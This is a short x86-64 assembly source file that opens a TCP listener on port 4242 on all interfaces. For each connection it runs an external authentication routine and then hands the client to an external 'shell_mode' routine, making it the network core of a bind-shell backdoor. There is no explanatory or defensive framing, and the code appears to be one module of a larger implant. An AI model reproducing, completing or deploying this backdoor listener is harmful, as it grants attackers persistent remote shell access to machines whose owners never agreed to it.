BITS 64

section .text
    global  create_server
    global  loop_server
    extern  shell_mode
    extern  auth
    extern client_fd
    extern sock_fd
    extern serv
    extern family
    extern port
    extern addr
    extern zero
    extern servlen
    extern client
    extern cfamily
    extern cport
    extern caddr
    extern czero
    extern clen

create_server:
    push    rbp
    mov     rbp, rsp
    xor     edx, edx ; IP
    xor     edi, edi
    xor     esi, esi
    add     edi, 2 ; AF_INET
    add     esi, 1 ; SOCK_STREAM
    add     eax, 0x29 ; socket
    syscall
    mov     [sock_fd], eax
    mov     edi, [sock_fd]
    xor     esi, esi
    xor     edx, edx
    add     rsi, 1
    add     rdx, 2 ; SO_REUSEADDRESS
    push    1
    lea     r10, [rsp]
    mov     r8, 4
    xor     eax, eax
    add     eax, 0x36 ; setsockopt
    syscall
    mov     [family], WORD 2 ; AF_INET
    mov     [port], DWORD 37392 ; htons(4242);
    mov     DWORD [addr], 0 ; htonl(INADDR_ANY)
    mov     edi, [sock_fd]
    lea     rsi, [rel serv]
    mov     rdx, servlen
    xor     eax, eax
    add     eax, 0x31 ; bind
    syscall
    mov     edi, DWORD [sock_fd]
    xor     eax, eax
    xor     esi, esi
    mov     esi, 1
    add     eax, 0x32 ; listen
    syscall
    leave
    ret

loop_server:
    mov     edi, DWORD [sock_fd]
    lea     rsi, [rel client]
    lea     rdx, [rel clen]
    xor     eax, eax
    add     eax, 0x2b ; accept
    syscall
    mov     [client_fd], DWORD eax
    mov     edi, [client_fd]
    call    auth
    cmp     rax, 0
    jne     bye
    mov     edi, [client_fd]
    call    shell_mode
bye:
    mov     edi, [client_fd]
    xor     eax, eax
    add     eax, 0x03 ; close
    syscall
    jmp     loop_server
    ret
